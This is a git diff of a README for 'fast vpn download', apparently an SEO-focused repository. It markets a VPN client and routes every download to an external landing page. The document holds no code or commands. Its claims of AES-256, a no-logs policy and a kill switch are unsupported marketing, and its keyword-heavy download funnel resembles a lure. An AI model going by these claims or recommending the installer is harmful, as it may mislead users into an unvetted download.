@@ -1,86 +1,91 @@
 # ⚡ fast vpn download
 
-[![Download](https://img.shields.io/badge/Download-Get%20Installer-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-download-landing/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-1f6feb?style=for-the-badge)](https://mandid22.github.io/fast-vpn-download-landing/)
-[![License](https://img.shields.io/badge/License-MIT-2ea043?style=for-the-badge)](https://github.com/mandid22/fast-vpn-download-seo)
+[![Download](https://img.shields.io/badge/Download-Get%20Build-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-download-landing/)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-3b82f6?style=for-the-badge)](https://mandid22.github.io/fast-vpn-download-landing/)
+[![License](https://img.shields.io/badge/License-MIT-16a34a?style=for-the-badge)](https://mandid22.github.io/fast-vpn-download-landing/)
 
 ## About
 
-**fast vpn download** is the quickest path to a VPN setup that prioritizes privacy and speed. It focuses on the basics that matter: **AES-256 encryption**, a strict **No-Logs policy**, a **Kill Switch**, and **Global Servers** tuned for **high speed** and a **stable connection**.
+**fast vpn download** is the quickest way to get a privacy-first VPN client set up and running. It focuses on the basics that matter: **high speed**, **stable connection**, and a clean UX that doesn’t fight you.
 
-Repo: https://github.com/mandid22/fast-vpn-download-seo  
-Get the installer / landing page: https://mandid22.github.io/fast-vpn-download-landing/
+This repo tracks the SEO + documentation surface for the project:  
+- Repo: https://github.com/mandid22/fast-vpn-download-seo  
+- Download landing: https://mandid22.github.io/fast-vpn-download-landing/
 
 ## Features
 
 - **AES-256 encryption** for traffic protection on public and private networks
-- **No-Logs policy** to keep usage history off the record
-- **Kill Switch** to block traffic if the tunnel drops
-- **Global Servers** for better routing and location flexibility
-- **High speed** connections that don’t feel like dial-up
-- **Stable connection** under long sessions (work, streaming, calls)
-- **Privacy and security focus** with minimal friction from install to connect
+- **No-Logs policy** to keep your browsing footprint minimal
+- **Kill Switch** to block traffic instantly if the tunnel drops
+- **Global Servers** for flexible routing and region options
+- **High speed** networking tuned for everyday browsing and streaming
+- **Stable connection** under typical Wi‑Fi and mobile hotspot conditions
+- **Privacy and security focus** with simple, predictable controls
 
 ## System Requirements
 
-| Item | Requirement |
+| Item | Minimum |
 |---|---|
-| Windows | Windows 10/11 (64-bit) |
+| Windows | Windows 10+ (64-bit) |
 | macOS | macOS 11+ |
-| Linux | Ubuntu 20.04+/Debian-based (or equivalent) |
-| RAM | 2 GB minimum (4 GB recommended) |
-| Storage | 200 MB free |
-| Internet | Any broadband connection (lower latency = better speed) |
+| Linux | Ubuntu 20.04+ / Debian 11+ (or equivalent) |
+| RAM | 2 GB+ |
+| Storage | 200 MB+ free |
+| Internet | Broadband connection (Wi‑Fi/Ethernet) |
 
 ## Installation
 
-All installs start here: https://mandid22.github.io/fast-vpn-download-landing/
+All downloads and install packages are published on the landing page:  
+https://mandid22.github.io/fast-vpn-download-landing/
 
 ### Windows
-1. Open the landing page and click **Download**.
-2. Run the installer (`.exe`).
-3. Launch the app, sign in, and connect to a server.
+1. Open the landing page link above.
+2. Download the Windows installer.
+3. Run the installer → finish setup.
+4. Launch the app → sign in → connect.
 
 ### macOS
-1. Open the landing page and click **Download**.
-2. Install the `.dmg` (drag to Applications if prompted).
-3. Open the app and approve VPN permissions when macOS asks.
+1. Open the landing page link above.
+2. Download the macOS package.
+3. Install (approve prompts if shown).
+4. Launch the app → connect to a server.
 
 ### Linux
-1. Open the landing page and download the Linux package.
-2. Install using your distro package manager (based on the provided package type).
-3. Launch the client and connect.
+1. Open the landing page link above.
+2. Download the Linux build/package listed.
+3. Install using your distro method (deb/rpm as provided).
+4. Start the app → connect.
 
 ## Comparison
 
 | Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
 |---|---:|:---:|:---:|:---:|:---:|
 | fast vpn | High speed | ✅ | ✅ | ✅ | ✅ |
-| Typical free VPN | Low / capped | ⚠️ | ⚠️ | ❌ | ⚠️ |
-| Manual proxy setup | Medium | ❌ | ❌ | ❌ | ⚠️ |
+| Typical free VPN | Mixed | ⚠️ | ⚠️ | ❌ | ⚠️ |
+| Proxy-only service | Variable | ❌ | ⚠️ | ❌ | ⚠️ |
 
 ## FAQ
 
-**Does fast vpn keep logs?**  
-It follows a **No-Logs policy**.
+**Does fast vpn support AES-256?**  
+Yes. Traffic is protected with **AES-256 encryption**.
 
 **Is there a Kill Switch?**  
-Yes. If the VPN drops, the **Kill Switch** blocks traffic to avoid leaks.
+Yes. Enable **Kill Switch** to prevent leaks during drops or reconnects.
 
-**Will it slow down my connection?**  
-Any VPN adds overhead, but this one is built for **high speed** and a **stable connection** with **Global Servers**.
+**Does it keep logs?**  
+It’s built around a **No-Logs policy**.
 
-**Where do I get the official installer?**  
-Use the landing page: https://mandid22.github.io/fast-vpn-download-landing/
+**How do I get the latest build?**  
+Use the official landing page: https://mandid22.github.io/fast-vpn-download-landing/
 
 ## Download
 
-Get **fast vpn download** here:  
+Get the official **fast vpn download** here:  
 **https://mandid22.github.io/fast-vpn-download-landing/**
 
 ## Final CTA
 
-[![Get fast vpn download](https://img.shields.io/badge/⚡%20Get%20fast%20vpn%20download-Download%20Now-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-download-landing/)
-[![Open Repository](https://img.shields.io/badge/View%20Repo-fast--vpn--download--seo-24292f?style=for-the-badge)](https://github.com/mandid22/fast-vpn-download-seo)
+[![Download fast vpn](https://img.shields.io/badge/⚡%20Download-fast%20vpn%20download-blue?style=for-the-badge)](https://mandid22.github.io/fast-vpn-download-landing/)
+[![Open Repository](https://img.shields.io/badge/Repo-fast--vpn--download--seo-111827?style=for-the-badge)](https://github.com/mandid22/fast-vpn-download-seo)
 
-*Fast setup. Private by default. Connect and get on with your day.*
+*Fast, private, and direct—grab the build, connect, and get on with your day.*
